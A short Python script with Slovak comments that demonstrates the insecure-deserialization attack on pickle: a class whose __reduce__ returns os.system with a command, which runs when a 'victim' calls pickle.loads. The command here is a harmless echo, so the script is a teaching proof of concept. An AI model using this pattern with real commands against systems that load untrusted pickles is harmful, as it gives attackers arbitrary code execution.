import pickle


# Trieda s malíciou
class MaliciousClass:
    def __reduce__(self):
        import os
        # `os.system` spustí ľubovoľný príkaz v systéme
        return (os.system, ("echo 'This is a malicious code execution!'",))

# Serializácia malíciou
malicious_data = pickle.dumps(MaliciousClass())

# Na strane obete: Deserializácia
pickle.loads(malicious_data)